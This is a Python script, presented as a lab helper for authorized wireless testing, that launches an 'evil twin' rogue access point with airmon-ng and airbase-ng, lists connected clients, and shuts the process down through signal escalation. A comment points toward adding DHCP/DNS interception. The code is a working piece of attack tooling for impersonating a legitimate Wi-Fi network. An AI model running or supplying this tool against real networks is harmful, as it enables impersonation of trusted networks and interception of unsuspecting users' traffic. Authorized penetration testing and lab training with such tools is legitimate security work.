"""Example Evil Twin lab helper with explicit subprocess cleanup.

This script is intended only for authorized wireless-security labs and
controlled penetration tests.
"""

import os
import signal
import subprocess
import sys
from typing import Optional


def start_evil_twin(ssid: str, interface: str) -> subprocess.Popen:
    """Start a fake access point and return its managed process handle."""
    subprocess.run(["airmon-ng", "check", "kill"], check=False)

    process = subprocess.Popen(
        ["airbase-ng", "-e", ssid, interface],
        start_new_session=(os.name != "nt"),
    )
    print(f"[+] Evil twin AP '{ssid}' started on interface {interface}")
    return process


def stop_evil_twin(process: Optional[subprocess.Popen]) -> None:
    """Stop the AP process and its descendants with signal escalation."""
    if process is None or process.poll() is not None:
        return

    def send_signal(sig: int) -> None:
        try:
            if os.name != "nt":
                os.killpg(process.pid, sig)
            else:
                process.send_signal(sig)
        except (ProcessLookupError, OSError):
            pass

    send_signal(signal.SIGINT)
    try:
        process.wait(timeout=3)
        return
    except subprocess.TimeoutExpired:
        print("[!] AP did not stop after SIGINT; sending SIGTERM")

    send_signal(signal.SIGTERM)
    try:
        process.wait(timeout=3)
        return
    except subprocess.TimeoutExpired:
        print("[!] AP did not stop after SIGTERM; forcing termination")

    try:
        if os.name != "nt":
            os.killpg(process.pid, signal.SIGKILL)
        else:
            process.kill()
    except (ProcessLookupError, OSError):
        pass
    process.wait()


def log_connected_users() -> None:
    """Show connected clients to the fake AP (conceptual)."""
    print("\n[+] Monitoring connected clients...\n")
    subprocess.run(["ifconfig", "ath0"], check=False)
    # This would normally be combined with DHCP/DNS interception.


def main() -> int:
    """Start the lab AP and guarantee cleanup on interruption or exit."""
    if os.geteuid() != 0:
        print("[-] Run as root!")
        return 1

    interface = "wlan0"  # Replace with your authorized wireless interface.
    target_ssid = "Fake-Free-WiFi"  # Mimic a legitimate SSID only in a lab.
    ap_process: Optional[subprocess.Popen] = None

    try:
        print("[i] Setting up evil twin AP...")
        ap_process = start_evil_twin(target_ssid, interface)
        log_connected_users()
    except KeyboardInterrupt:
        print("\n[!] Interrupt received; stopping evil twin AP...")
    except FileNotFoundError as error:
        print(f"[-] Required wireless tool not found: {error}")
        return 1
    finally:
        stop_evil_twin(ap_process)

    return 0


if __name__ == "__main__":
    sys.exit(main())
